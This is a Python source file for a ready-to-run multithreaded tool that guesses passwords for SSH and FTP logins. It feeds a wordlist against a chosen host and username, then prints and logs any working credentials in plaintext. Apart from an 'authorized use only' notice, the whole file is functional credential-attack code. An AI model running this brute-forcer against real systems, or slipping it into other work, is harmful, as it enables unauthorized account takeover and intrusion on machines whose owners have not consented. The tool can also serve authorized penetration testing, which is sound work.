import argparse
import sys
import threading
import queue
import time
import ftplib
import logging
from colorama import init, Fore, Style

try:
    import paramiko
    PARAMIKO_AVAILABLE = True
except ImportError:
    PARAMIKO_AVAILABLE = False

init()

logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s - %(levelname)s - %(message)s',
    filename='brute_forcer.log'
)


class BruteForcer:
    """
    Credential tester for SSH and FTP services.
    Use only against systems you own or have explicit written permission to test.
    """

    def __init__(self, host, port, username, wordlist_path, protocol='ssh', threads=4, timeout=5):
        self.host = host
        self.port = port
        self.username = username
        self.wordlist_path = wordlist_path
        self.protocol = protocol.lower()
        self.threads = threads
        self.timeout = timeout
        self.found = None
        self.attempts = 0
        self.lock = threading.Lock()
        self.password_queue = queue.Queue()
        self.start_time = None

    def validate(self):
        if self.protocol == 'ssh' and not PARAMIKO_AVAILABLE:
            print(f"{Fore.RED}[ERROR] paramiko is required for SSH: pip install paramiko{Style.RESET_ALL}")
            return False
        if self.protocol not in ('ssh', 'ftp'):
            print(f"{Fore.RED}[ERROR] Protocol must be 'ssh' or 'ftp'{Style.RESET_ALL}")
            return False
        try:
            with open(self.wordlist_path, 'r', encoding='utf-8', errors='ignore'):
                pass
        except FileNotFoundError:
            print(f"{Fore.RED}[ERROR] Wordlist not found: {self.wordlist_path}{Style.RESET_ALL}")
            return False
        return True

    def try_ssh(self, password):
        client = paramiko.SSHClient()
        client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
        try:
            client.connect(
                self.host, port=self.port, username=self.username,
                password=password, timeout=self.timeout,
                allow_agent=False, look_for_keys=False
            )
            client.close()
            return True
        except paramiko.AuthenticationException:
            return False
        except Exception:
            return False

    def try_ftp(self, password):
        try:
            ftp = ftplib.FTP()
            ftp.connect(self.host, self.port, timeout=self.timeout)
            ftp.login(self.username, password)
            ftp.quit()
            return True
        except ftplib.error_perm:
            return False
        except Exception:
            return False

    def worker(self):
        attempt_fn = self.try_ssh if self.protocol == 'ssh' else self.try_ftp
        while not self.found:
            try:
                password = self.password_queue.get_nowait()
            except queue.Empty:
                break
            with self.lock:
                self.attempts += 1
            success = attempt_fn(password)
            if success:
                with self.lock:
                    if not self.found:
                        self.found = password
                        elapsed = time.time() - self.start_time
                        print(f"\n{Fore.GREEN}[+] Credentials found!{Style.RESET_ALL}")
                        print(f"    Username : {self.username}")
                        print(f"    Password : {password}")
                        print(f"    Attempts : {self.attempts:,}")
                        print(f"    Time     : {elapsed:.2f}s")
                        logging.info(f"Found: {self.username}:{password} after {self.attempts} attempts")
            self.password_queue.task_done()

    def run(self):
        if not self.validate():
            sys.exit(1)

        print(f"{Fore.CYAN}Brute Force Tester{Style.RESET_ALL}")
        print(f"Target   : {self.host}:{self.port} ({self.protocol.upper()})")
        print(f"Username : {self.username}")
        print(f"Wordlist : {self.wordlist_path}")
        print(f"Threads  : {self.threads}")
        print(f"{Fore.CYAN}{'='*50}{Style.RESET_ALL}")

        with open(self.wordlist_path, 'r', encoding='utf-8', errors='ignore') as f:
            for line in f:
                self.password_queue.put(line.strip())

        total = self.password_queue.qsize()
        print(f"Loaded {total:,} passwords")

        self.start_time = time.time()
        threads = []
        for _ in range(min(self.threads, total)):
            t = threading.Thread(target=self.worker, daemon=True)
            t.start()
            threads.append(t)

        self.password_queue.join()
        for t in threads:
            t.join()

        elapsed = time.time() - self.start_time
        if not self.found:
            print(f"\n{Fore.RED}[-] Password not found in wordlist.{Style.RESET_ALL}")
            print(f"    Attempts : {self.attempts:,}")
            print(f"    Time     : {elapsed:.2f}s")
            logging.info(f"Not found after {self.attempts} attempts")


def main():
    parser = argparse.ArgumentParser(
        description="SSH/FTP credential tester — authorized use only"
    )
    parser.add_argument("host", help="Target host (e.g., 192.168.1.10)")
    parser.add_argument("username", help="Username to test")
    parser.add_argument("wordlist", help="Path to password wordlist")
    parser.add_argument("--protocol", choices=['ssh', 'ftp'], default='ssh',
                        help="Protocol to test (default: ssh)")
    parser.add_argument("--port", type=int, help="Port (default: 22 for SSH, 21 for FTP)")
    parser.add_argument("--threads", type=int, default=4,
                        help="Number of concurrent threads (default: 4)")
    parser.add_argument("--timeout", type=int, default=5,
                        help="Connection timeout in seconds (default: 5)")
    args = parser.parse_args()

    default_ports = {'ssh': 22, 'ftp': 21}
    port = args.port or default_ports[args.protocol]

    try:
        bf = BruteForcer(args.host, port, args.username, args.wordlist,
                         args.protocol, args.threads, args.timeout)
        bf.run()
    except KeyboardInterrupt:
        print(f"\n{Fore.YELLOW}[!] Interrupted by user{Style.RESET_ALL}")
        sys.exit(0)
    except Exception as e:
        print(f"{Fore.RED}[ERROR] {str(e)}{Style.RESET_ALL}")
        sys.exit(1)


if __name__ == "__main__":
    main()
